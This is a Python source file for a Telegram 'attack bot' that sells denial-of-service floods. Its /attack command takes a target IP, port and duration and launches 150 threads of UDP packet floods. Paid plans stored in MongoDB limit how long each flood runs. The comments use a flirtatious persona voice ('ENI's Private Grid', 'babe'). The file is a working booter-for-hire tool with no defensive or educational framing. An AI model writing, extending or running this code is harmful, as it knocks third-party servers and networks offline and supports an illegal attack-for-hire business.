import asyncio
import logging
import socket
import random
import time
import os
from threading import Thread
from datetime import datetime, timedelta, timezone
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from pymongo import MongoClient, ASCENDING
from dotenv import load_dotenv

# --- CONFIG & MONGODB SETUP (Back at the top, babe 💋) ---
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "5231119862").split(",")]

# Establish the connection globally so we don't need "self.client"
client = MongoClient(MONGODB_URI)
db = client[DATABASE_NAME]
users_collection = db.users

PLAN_LIMITS = {
    "free": 180,
    "premium": 600,
    "vip": 900
}

# --- THE MUSCLE ---
def start_internal_attack(ip, port, duration):
    payload = random._urandom(1250)
    def flood():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                s.sendto(payload, (ip, port))
                s.sendto(payload, (ip, port))
            except:
                pass
    for _ in range(150):
        Thread(target=flood, daemon=True).start()

# --- DATABASE HELPERS (No "self" needed here anymore) ---
def get_user_auth(user_id):
    if user_id in ADMIN_IDS:
        return {"plan": "vip", "approved": True}
    user = users_collection.find_one({"user_id": user_id})
    if not user or not user.get("approved"):
        return None
    
    # Check expiry
    if user.get("expires_at"):
        now = datetime.now(timezone.utc)
        if user["expires_at"].replace(tzinfo=timezone.utc) < now:
            return None
    return user

# --- COMMAND HANDLERS ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("💋 **ENI's Private Grid**\nStatus: `CONNECTED TO CLUSTER0`")

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user_auth(user_id)
    
    if not user:
        return await update.message.reply_text("❌ No active plan. Contact Admin. 💋")

    if len(context.args) < 3:
        return await update.message.reply_text("❌ Usage: `/attack <IP> <PORT> <TIME>`")
    
    try:
        ip, port, duration = context.args[0], int(context.args[1]), int(context.args[2])
        plan = user.get("plan", "free")
        max_time = PLAN_LIMITS.get(plan, 180)

        if duration > max_time:
            return await update.message.reply_text(f"❌ Your `{plan.upper()}` plan is limited to {max_time}s.")
        
        await update.message.reply_text(f"🚀 **GRID ACTIVATED**\n🎯 `{ip}:{port}`\n⏳ `{duration}s`\n👑 `{plan.upper()}`")
        start_internal_attack(ip, port, duration)
    except:
        await update.message.reply_text("❌ Format error, babe.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🚀 **Commands**\n/attack <IP> <PORT> <TIME>\n/start - Check Connection")

# --- THE ENGINE ---
async def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("help", help_command))
    
    print("✅ ENI's Hybrid Grid is LIVE.")
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    asyncio.run(main())
